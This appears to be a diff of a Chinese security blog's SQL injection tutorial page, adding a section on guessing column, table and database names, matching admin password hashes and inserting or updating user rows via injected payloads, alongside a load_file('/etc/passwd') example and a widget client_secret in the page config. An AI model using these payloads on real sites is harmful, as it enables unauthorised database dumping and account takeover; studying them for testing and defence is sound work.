@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>手动漏洞挖掘-SQL注入、一 | Pyrrhax</title>
+    <title>SQL注入（一）SQL注入的利用思路 | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -203,7 +203,7 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/17/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
        <meta itemprop="name" content="Pyrrhax">
        <meta itemprop="description" content="">
@@ -214,7 +214,7 @@
       </span>
     </div>
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">手动漏洞挖掘-SQL注入、一</h1>
+      <h1 class="post-title" itemprop="name headline">SQL注入（一）SQL注入的利用思路</h1>
       <div class="post-meta">
         
         <span class="post-date">
@@ -236,7 +236,10 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <h3 id="手动漏洞挖掘-SQL注入（一）"><a href="#手动漏洞挖掘-SQL注入（一）" class="headerlink" title="手动漏洞挖掘-SQL注入（一）"></a>手动漏洞挖掘-SQL注入（一）</h3><h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul>
+      <h3 id="SQL注入（一）SQL注入的利用思路"><a href="#SQL注入（一）SQL注入的利用思路" class="headerlink" title="SQL注入（一）SQL注入的利用思路"></a>SQL注入（一）SQL注入的利用思路</h3><p>从检测到拖库的基本流程</p>
+<a id="more"></a>
+
+<h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul>
 <li>基于报错的检测方法<ul>
 <li>’    ”    %    （）</li>
 </ul>
@@ -280,7 +283,7 @@
 </ul>
 </li>
 </ul>
-<a id="more"></a>
+<!--more-->
 
 <h4 id="四、获取有用的数据"><a href="#四、获取有用的数据" class="headerlink" title="四、获取有用的数据"></a>四、获取有用的数据</h4><ul>
 <li>一些常用的函数：<ul>
@@ -298,7 +301,7 @@
 </ul>
 </li>
 </ul>
-<h4 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h4><ul>
+<h4 id="五、拖库"><a href="#五、拖库" class="headerlink" title="五、拖库"></a>五、拖库</h4><h5 id="有权限读取information-schema库"><a href="#有权限读取information-schema库" class="headerlink" title="有权限读取information_schema库"></a>有权限读取information_schema库</h5><ul>
 <li>MySQL数据查询（元数据的表 information_schema）<ul>
 <li>查询有那些库<ul>
 <li>select schema_name from information_schema.schemata;</li>
@@ -325,7 +328,41 @@
 </ul>
 </li>
 </ul>
-<h4 id="其它利用场景"><a href="#其它利用场景" class="headerlink" title="其它利用场景"></a>其它利用场景</h4><ul>
+<h5 id="无权读取information-schema库-拒绝union、order-by语句"><a href="#无权读取information-schema库-拒绝union、order-by语句" class="headerlink" title="无权读取information_schema库 / 拒绝union、order by语句"></a>无权读取information_schema库 / 拒绝union、order by语句</h5><ul>
+<li><p>第一步、猜列名：<code>&#39; and asd is null --</code></p>
+<ul>
+<li>可以通过返回信息得到 asd这个列是否存在，提前准备好字典。用burp Intruder</li>
+<li><code>find / -name *.column*.txt</code><ul>
+<li>去除以#开头的行<code>cat xxx.txt | grep -v ^# &gt; column.txt</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>通过列名猜当前表名：<code>&#39; and table.user is null --</code></p>
+<ul>
+<li><code>find / -name *.table.txt</code><ul>
+<li>同样需要去除#开头的行</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>猜库名：<code>&#39; and db.table.user is null --</code></p>
+</li>
+<li><p>猜库中的其他表：<code>&#39; and (select count(*) from table)&gt;0 --</code></p>
+</li>
+<li><p>猜表对应关系：<code>&#39; and user.user is null --</code></p>
+</li>
+<li><p>猜字段内容：<code>or user=&#39;admin</code>,<code>or user like &#39;%a%&#39;</code></p>
+</li>
+<li><p>账号对应密码：<code>&#39; or user = &#39;admin&#39; and password = &#39;md5hash&#39;</code></p>
+<ul>
+<li>用md5sum命令把密码字典生成MD5字典，然后intruder</li>
+</ul>
+</li>
+<li><p>可以插入账号密码数据条目<code>&#39;; insert xxxxxx</code>,<code>&#39;;update users set user=&#39;aaa&#39; where user=&#39;bbb&#39;</code></p>
+</li>
+</ul>
+<h4 id="六、其它利用场景"><a href="#六、其它利用场景" class="headerlink" title="六、其它利用场景"></a>六、其它利用场景</h4><ul>
 <li>读取文件<ul>
 <li>select load_file(‘/etc/passwd’)</li>
 </ul>
@@ -380,7 +417,7 @@
     </div>
     <div class="page-nav-prev page-nav-item">
       
-      <a href="/2020/10/19/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%BA%8C/" rel="prev" title="手动漏洞挖掘-SQL注入、二"><span class="nav-title">手动漏洞挖掘-SQL注入、二</span><i class="fas fa-angle-right"></i></a>
+      <a href="/2020/10/19/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89Bypass%E6%8A%80%E5%B7%A7/" rel="prev" title="SQL注入（三）Bypass技巧"><span class="nav-title">SQL注入（三）Bypass技巧</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -407,7 +444,7 @@
       "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
       "no_comment": "这个页面还没有评论，现在就去评论吧！",
       "go_to_comment": "去评论",
-      "issue_title": "手动漏洞挖掘-SQL注入、一",
+      "issue_title": "SQL注入（一）SQL注入的利用思路",
       "btn_class": "button",
       "comments_target": "#comment-thread"
     });
@@ -464,7 +501,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">84</a></div>
+      <div><a href="/archives/">83</a></div>
     </div>
     
     
@@ -478,7 +515,7 @@
     
     <div class="tags-count count-block">
       <div class="site-count-title">标签</div>
-      <div><a href="/tags/">14</a></div>
+      <div><a href="/tags/">13</a></div>
     </div>
     
     
@@ -502,7 +539,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#手动漏洞挖掘-SQL注入（一）"><span class="toc-text">手动漏洞挖掘-SQL注入（一）</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#一、检测是否存在注入"><span class="toc-text">一、检测是否存在注入</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#二、查明查询返回的列数"><span class="toc-text">二、查明查询返回的列数</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#三、找到一个使用字符串数据类型的列"><span class="toc-text">三、找到一个使用字符串数据类型的列</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#四、获取有用的数据"><span class="toc-text">四、获取有用的数据</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#拖库"><span class="toc-text">拖库</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#其它利用场景"><span class="toc-text">其它利用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#SQL注入（一）SQL注入的利用思路"><span class="toc-text">SQL注入（一）SQL注入的利用思路</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#一、检测是否存在注入"><span class="toc-text">一、检测是否存在注入</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#二、查明查询返回的列数"><span class="toc-text">二、查明查询返回的列数</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#三、找到一个使用字符串数据类型的列"><span class="toc-text">三、找到一个使用字符串数据类型的列</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#四、获取有用的数据"><span class="toc-text">四、获取有用的数据</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#五、拖库"><span class="toc-text">五、拖库</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#有权限读取information-schema库"><span class="toc-text">有权限读取information_schema库</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#无权读取information-schema库-拒绝union、order-by语句"><span class="toc-text">无权读取information_schema库 &#x2F; 拒绝union、order by语句</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#六、其它利用场景"><span class="toc-text">六、其它利用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
     </div>
     
     
